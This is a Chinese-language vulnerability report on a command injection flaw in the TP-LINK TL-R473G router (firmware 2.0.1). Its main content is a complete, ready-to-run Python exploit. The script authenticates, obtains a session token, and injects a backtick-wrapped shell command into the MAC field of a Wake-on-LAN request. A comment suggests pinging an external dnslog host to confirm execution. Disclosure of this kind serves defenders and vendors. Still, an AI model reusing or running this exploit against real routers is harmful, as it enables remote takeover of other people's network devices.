# TP-LINK TL-R473G 存在命令注入漏洞

**CVE ID**:  

**CNVD ID**: 

**漏洞厂商**:  TP-LINK

**厂商官网**: https://www.tp-link.com.cn/、https://www.tp-link.com/

**影响产品**: TL-R473G

**影响产品版本**: 2.0.1 Build 220529 Rel.65574n(最新版)

**固件链接**: 非最新版固件 https://smb.tp-link.com.cn/service/detail_download_8644.html

**报送者**: [SkYe231](mailto:skye231@foxmail.com)@Hillstone

## 漏洞描述

TP-LINK TL-R473G存在远程命令执行漏洞，攻击者可以通过精心构造的数据包绕过限制，实现远程命令执行。

## 漏洞详情

没有有效的MAC地址过滤，仅将`-`替换为`:`。

![image-20220621165232656](./img/image-20220621165232656.png)

## EXP

```python
# encoding:utf-8
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import json,sys

TIMEOUT_MAX = 60
HOST = sys.argv[1]
USERNAME = sys.argv[2]
PASSWORD = sys.argv[3]
COMMAND = sys.argv[4]#"ping a5urz4.dnslog.cn"

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def get_stok(host,username,password):
    headers = {
        "Content-Type":"application/json; charset=UTF-8"
    }
    data = {"method":"do","login":{"username":username,"password":password}}
    url = host
    response = requests.post(url=url,headers=headers,data=json.dumps(data),verify=False,timeout=TIMEOUT_MAX)
    stok = json.loads(response.text)["stok"]
    print("[+]Get stok:",stok)
    return stok

def rce(host,stok):
    url = host+"/stok="+stok+"/ds"
    headers = {
        "Content-Type":"application/json; charset=UTF-8"
    }
    data = {"method":"do","wol":{"wol_wake":{"mac":"DC-DC-DC-DC-`{}`-DC".format(COMMAND),"usrif":"LAN"}}}
    response = requests.post(url=url,headers=headers,data=json.dumps(data))
    if json.loads(response.text)["error_code"] == 0 :
        print("[+]Success")
    else:
        print("[-]Error")

def exp(host,username,password):
    host = host.strip()
    if host[:4] != "http":
        host = "http://" + host
    stok = get_stok(host,username,password)
    if stok != -1:
        rce(host,stok)

if __name__ == "__main__":
    exp(HOST,USERNAME,PASSWORD)
```

